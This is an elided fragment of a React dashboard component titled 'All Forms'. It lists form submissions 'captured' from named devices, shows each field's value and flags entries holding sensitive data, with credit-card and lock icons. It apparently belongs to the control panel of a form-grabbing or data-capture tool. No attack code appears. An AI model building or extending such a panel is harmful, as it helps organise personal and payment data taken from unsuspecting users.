...
import { FileText, Search, Filter, Trash2, Copy, ChevronRight, CreditCard, Lock, Hash, DollarSign } from 'lucide-react'
            ...
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-2">
                <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold ${
                  form.hasSensitive ? 'bg-yellow-500/10 text-yellow-500' : 'bg-green-500/10 text-green-500'
                }`}>
                  <FileText className="h-3 w-3" />
                  {form.hasSensitive ? 'SENSITIVE' : 'Normal'}
                </span>
                <span className="text-[11px] text-muted-foreground font-mono">{form.timestamp_formatted}</span>
                <span className="font-semibold text-foreground truncate max-w-[200px]">{form.deviceName}</span>
              </div>
              <p className="mt-1 text-sm text-muted-foreground font-mono">{form.keys.join(', ')}</p>
            </div>
            <div className="flex items-center gap-2">
              <button
          ...
          <AnimatePresence>
            {isExpanded && (
              <motion.div
                ...
                className="px-4 pb-4 border-t border-border/50 mt-2"
              >
                  ...
                  {Object.entries(form.content).map(([key, value]) => (
                    <div key={key} className="flex items-center gap-3 p-2 rounded-lg bg-secondary/30">
                      ...
                      <div className="flex-1 min-w-0">
                        ...
                        <p className="text-sm font-mono text-foreground break-all truncate">{value}</p>
                      </div>
                      <button
  ...
  return (
    <div className="p-5 space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-black text-foreground">All Forms</h1>
          <p className="text-sm text-muted-foreground mt-1">{forms.length} total • {forms.filter(f => f.hasSensitive).length} with sensitive data</p>
        </div>
      </div>
      <div className="flex flex-col sm:flex-row gap-4">
        <div className="relative flex-1">
          ...
          <input
            ...
            className="w-full pl-10 pr-4 py-2.5 rounded-xl bg-secondary/50 border border-border focus:outline-none focus:ring-2 focus:ring-primary/20"
          />
        </div>
        <select
          value={filter}
          onChange={(e) => setFilter(e.target.value)}
          className="px-4 py-2.5 rounded-xl bg-secondary/50 border border-border focus:outline-none focus:ring-2 focus:ring-primary/20"
        >
        ...
        <div className="divide-y divide-border/50">
          {filteredForms.length === 0 ? (
            <div className="p-10 text-center">
              ...
              <p className="text-muted-foreground">No forms captured yet</p>
            </div>
          ) : (
